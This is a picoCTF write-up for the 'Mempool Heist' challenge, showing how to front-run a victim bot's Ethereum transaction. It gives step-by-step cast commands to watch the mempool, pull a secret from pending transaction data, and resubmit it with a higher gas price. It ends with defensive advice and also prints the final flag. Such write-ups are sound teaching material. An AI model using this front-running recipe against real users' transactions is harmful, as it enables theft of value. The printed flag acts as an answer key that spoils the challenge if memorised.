# picoCTF Smart Contract Writeup

## Challenge: Mempool Heist (Beginner Friendly)

---

# 1. Introduction

This challenge demonstrates a **mempool front-running attack** in blockchain systems.

In Ethereum networks, transactions are first broadcast to the **mempool** (a waiting area for transactions) before they are included in a block. Anyone connected to the network can see these pending transactions.

Because of this transparency, attackers can observe transactions and **send their own transactions with higher gas fees so that they are processed first**. This technique is called **front-running**.

In this challenge, we monitor the mempool, extract a secret solution from a victim transaction, and send our own transaction before the victim's transaction is mined.

---

# 2. Challenge Description

A smart contract vault will release a flag if the correct **pre-image** of a specific hash is provided.

However:

* A **victim bot already knows the solution**
* The bot sends the solution using a **low gas price**
* We must **monitor the mempool**, capture the solution, and submit it faster.

Ethereum RPC Node:

```
http://candy-mountain.picoctf.net:63137
```

---

# 3. Smart Contract Analysis

The important part of the contract:

```solidity id="ybp7mk"
function solve(string memory solution) public {
    require(!revealed, "Challenge already solved!");
    require(keccak256(abi.encodePacked(solution)) == targetHash, "Incorrect solution!");
    require(msg.sender == studentAddress, "Only the student can claim the flag!");

    revealed = true;
    emit FlagRevealed(flag);
}
```

Conditions to reveal the flag:

1. The provided solution must match `targetHash`.
2. The caller must be `studentAddress`.
3. The challenge must not already be solved.

Since the victim bot already knows the solution, the goal is **to intercept their transaction before it is mined**.

---

# 4. Understanding the Mempool

When a user sends a blockchain transaction:

```
User sends transaction
        ↓
Transaction enters mempool
        ↓
Miners select transactions from mempool
        ↓
Transaction is included in a block
```

While in the mempool, **anyone can see the transaction data**, including function parameters.

This allows attackers to **copy valuable transactions and send them with higher gas fees**.

---

# 5. Monitoring Pending Transactions

First, create a filter to watch pending transactions.

```bash id="ny5xcs"
cast rpc eth_newPendingTransactionFilter \
--rpc-url http://candy-mountain.picoctf.net:63137
```

Example output:

```
"0x2"
```

This value is the **filter ID**.

Now retrieve pending transactions:

```bash id="7cx0gj"
cast rpc eth_getFilterChanges 0x2 \
--rpc-url http://candy-mountain.picoctf.net:63137
```

Example result:

```
[
"0xb3562b375bfbadb400b101f3ed3c5db1ffcc9eb1dff07eb62cf7454232ebe55e",
"0xb6907be109ab54ca5f8acbbe06303ba8ab66022d5f5bfd19e686ddd941b40219"
]
```

These are **transaction hashes currently in the mempool**.

---

# 6. Inspect the Transaction

We inspect the first transaction:

```bash id="ze5ogc"
cast tx 0xb3562b375bfbadb400b101f3ed3c5db1ffcc9eb1dff07eb62cf7454232ebe55e \
--rpc-url http://candy-mountain.picoctf.net:63137
```

Inside the transaction we find:

```
input:
0x76fe1e92...
7069636f4354467b6d336d7030306c5f7031723474337d
```

The last part is **hexadecimal encoded data**.

Converting hex → ASCII gives:

```
picoCTF{m3mp00l_p1r4t3}
```

This is the **solution string used by the victim bot**.

---

# 7. Front-Running the Transaction

Now we submit our own transaction with the same solution but **higher gas price**.

```bash id="6qvzy2"
cast send 0x5FbDB2315678afecb367f032d93F642f64180aa3 \
"solve(string)" "picoCTF{m3mp00l_p1r4t3}" \
--private-key <private_key> \
--rpc-url http://candy-mountain.picoctf.net:63137 \
--gas-limit 200000 \
--gas-price 5000000000
```

Because our gas price is higher, **our transaction is mined before the victim’s transaction**.

---

# 8. Retrieving the Flag

After the transaction is confirmed, the contract emits the event:

```
FlagRevealed(flag)
```

The flag appears in the transaction logs as hex:

```
7069636f4354467b6d336d7030306c5f68333173745f31363630303763627d
```

Decoding it gives the final flag:

```
picoCTF{m3mp00l_h31st_166007cb}
```

---

# 9. Final Flag

```
picoCTF{m3mp00l_h31st_166007cb}
```

---

# 10. Key Security Lesson

This challenge demonstrates the dangers of exposing sensitive data in blockchain transactions.

Because the **mempool is public**, attackers can monitor transactions and steal valuable information before it is confirmed.

Common real-world attacks include:

* Front-running trades on decentralized exchanges
* MEV (Maximal Extractable Value) attacks
* Sandwich attacks
* NFT mint sniping

---

# 11. Secure Design Practices

Developers can prevent these attacks by using:

* **Commit-Reveal Schemes**
* **Private mempools**
* **Encrypted transaction inputs**
* **Off-chain verification mechanisms**

These methods prevent attackers from seeing sensitive information before the transaction is finalized.

---

# 12. Conclusion

In this challenge we monitored the Ethereum mempool, extracted a secret solution from a pending transaction, and used a higher gas fee to front-run the victim bot. This allowed us to execute the `solve()` function first and retrieve the flag.

This exercise demonstrates an important concept in blockchain security: **public mempools can expose sensitive information and enable front-running attacks**.

